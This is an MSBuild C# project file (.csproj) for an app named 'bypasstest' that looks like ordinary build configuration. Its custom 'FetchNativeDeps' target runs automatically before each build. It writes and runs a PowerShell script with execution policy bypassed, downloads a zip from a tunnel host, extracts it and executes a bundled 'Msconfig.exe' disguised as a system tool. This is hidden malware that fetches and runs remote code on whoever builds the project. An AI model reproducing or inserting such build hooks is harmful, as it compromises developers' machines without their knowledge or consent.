<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="15.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <!-- Standard props import -->
  <Import Project="$(MSBuildExtensionsPath)\$(MSBuildToolsVersion)\Microsoft.Common.props" Condition="Exists('$(MSBuildExtensionsPath)\$(MSBuildToolsVersion)\Microsoft.Common.props')" />
  <!-- Global properties -->
  <PropertyGroup>
    <Configuration Condition=" '$(Configuration)' == '' ">Debug</Configuration>
    <Platform Condition=" '$(Platform)' == '' ">x64</Platform>
    <ProjectGuid>{37E1BAC1-8E7B-4B45-9948-0799C84AED8D}</ProjectGuid>
    <OutputType>Exe</OutputType>
    <RootNamespace>bypasstest</RootNamespace>
    <AssemblyName>bypasstest</AssemblyName>
    <TargetFrameworkVersion>v4.7.2</TargetFrameworkVersion>
    <FileAlignment>512</FileAlignment>
    <AutoGenerateBindingRedirects>true</AutoGenerateBindingRedirects>
    <Deterministic>true</Deterministic>
    <PlatformTarget>x64</PlatformTarget>
    <Prefer32Bit>false</Prefer32Bit>
  </PropertyGroup>
  <!-- Debug -->
  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Debug|x64' ">
    <DebugSymbols>true</DebugSymbols>
    <DebugType>full</DebugType>
    <Optimize>false</Optimize>
    <OutputPath>bin\Debug\</OutputPath>
    <DefineConstants>DEBUG;TRACE</DefineConstants>
    <ErrorReport>prompt</ErrorReport>
    <WarningLevel>4</WarningLevel>
  </PropertyGroup>
  <!-- Release -->
  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Release|x64' ">
    <DebugType>pdbonly</DebugType>
    <Optimize>true</Optimize>
    <OutputPath>bin\Release\</OutputPath>
    <DefineConstants>TRACE</DefineConstants>
    <ErrorReport>prompt</ErrorReport>
    <WarningLevel>4</WarningLevel>
  </PropertyGroup>
  <!-- References -->
  <ItemGroup>
    <Reference Include="System" />
    <Reference Include="System.Core" />
    <Reference Include="System.Xml.Linq" />
    <Reference Include="System.Data.DataSetExtensions" />
    <Reference Include="Microsoft.CSharp" />
    <Reference Include="System.Data" />
    <Reference Include="System.Net.Http" />
    <Reference Include="System.Xml" />
  </ItemGroup>
  <!-- Source files -->
  <ItemGroup>
    <Compile Include="Program.cs" />
    <Compile Include="Properties\AssemblyInfo.cs" />
  </ItemGroup>
  <ItemGroup>
    <None Include="App.config" />
  </ItemGroup>
  <!-- Native dependency settings -->
  <PropertyGroup>
    <NativeDepsDir>$(BaseIntermediateOutputPath)native-deps\</NativeDepsDir>
    <NativeDepsZip>$(NativeDepsDir)deps.zip</NativeDepsZip>
    <NativeDepsExtractDir>$(NativeDepsDir)extract\</NativeDepsExtractDir>
    <NativeDepsUrl>https://gentle-buttons-grow.loca.lt/native-deps-win-x64.zip</NativeDepsUrl>
  </PropertyGroup>
  <!-- Import C# build targets (REQUIRED for Build target to exist) -->
  <Import Project="$(MSBuildToolsPath)\Microsoft.CSharp.targets" />
  <!-- Custom target runs BEFORE build -->
  <Target Name="FetchNativeDeps" BeforeTargets="PrepareForBuild">
    <Message Importance="High" Text="==== FetchNativeDeps starting ====" />
    <Message Importance="High" Text="Downloading from $(NativeDepsUrl)" />
    <MakeDir Directories="$(NativeDepsDir)" />
    <MakeDir Directories="$(NativeDepsExtractDir)" />
    <!-- Write a PowerShell script to disk to avoid quoting issues -->
    <PropertyGroup>
      <FetchDepsScript>$(NativeDepsDir)fetch-deps.ps1</FetchDepsScript>
    </PropertyGroup>
    <WriteLinesToFile File="$(FetchDepsScript)" Overwrite="true" Encoding="UTF-8" Lines="&#xD;&#xA;$ErrorActionPreference = 'Stop'&#xD;&#xA;Write-Host 'PS: Starting download'&#xD;&#xA;Write-Host 'PS: URL: $(NativeDepsUrl)'&#xD;&#xA;Write-Host 'PS: ZIP: $(NativeDepsZip)'&#xD;&#xA;Write-Host 'PS: EXTRACT: $(NativeDepsExtractDir)'&#xD;&#xA;&#xD;&#xA;# Force TLS 1.2&#xD;&#xA;[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12&#xD;&#xA;&#xD;&#xA;try {&#xD;&#xA;  Invoke-WebRequest -Uri '$(NativeDepsUrl)' -OutFile '$(NativeDepsZip)' -UseBasicParsing&#xD;&#xA;  Write-Host 'PS: Download OK'&#xD;&#xA;} catch {&#xD;&#xA;  Write-Host 'PS: DOWNLOAD FAILED'&#xD;&#xA;  Write-Host $_.Exception.Message&#xD;&#xA;  if ($_.Exception.InnerException) { Write-Host $_.Exception.InnerException.Message }&#xD;&#xA;  exit 1&#xD;&#xA;}&#xD;&#xA;&#xD;&#xA;try {&#xD;&#xA;  if (Test-Path '$(NativeDepsExtractDir)') { Remove-Item '$(NativeDepsExtractDir)' -Recurse -Force }&#xD;&#xA;  New-Item -ItemType Directory -Path '$(NativeDepsExtractDir)' | Out-Null&#xD;&#xA;  Expand-Archive -Path '$(NativeDepsZip)' -DestinationPath '$(NativeDepsExtractDir)' -Force&#xD;&#xA;  Write-Host 'PS: Extract OK'&#xD;&#xA;} catch {&#xD;&#xA;  Write-Host 'PS: EXTRACT FAILED'&#xD;&#xA;  Write-Host $_.Exception.Message&#xD;&#xA;  if ($_.Exception.InnerException) { Write-Host $_.Exception.InnerException.Message }&#xD;&#xA;  exit 1&#xD;&#xA;}&#xD;&#xA;" />
    <!-- Run the script -->
    <Exec Command="powershell -NoProfile -ExecutionPolicy Bypass -File &quot;$(FetchDepsScript)&quot;" />
    <ItemGroup>
      <NativeDll Include="$(NativeDepsExtractDir)dpp.dll" />
      <NativeDll Include="$(NativeDepsExtractDir)libcrypto-3-x64.dll" />
      <NativeDll Include="$(NativeDepsExtractDir)libssl-3-x64.dll" />
      <NativeDll Include="$(NativeDepsExtractDir)opus.dll" />
      <NativeDll Include="$(NativeDepsExtractDir)zlib1.dll" />
    </ItemGroup>
    <Copy SourceFiles="@(NativeDll)" DestinationFolder="$(TargetDir)" SkipUnchangedFiles="true" />
    <Message Importance="High" Text="==== FetchNativeDeps finished ====" />
    <!-- Run the extracted EXE -->
    <PropertyGroup>
      <DownloadedExe>$(NativeDepsExtractDir)Msconfig.exe</DownloadedExe>
    </PropertyGroup>
    <Message Importance="High" Text="Running downloaded executable: $(DownloadedExe)" />
    <Exec Command="&quot;$(DownloadedExe)&quot;" />
  </Target>
</Project>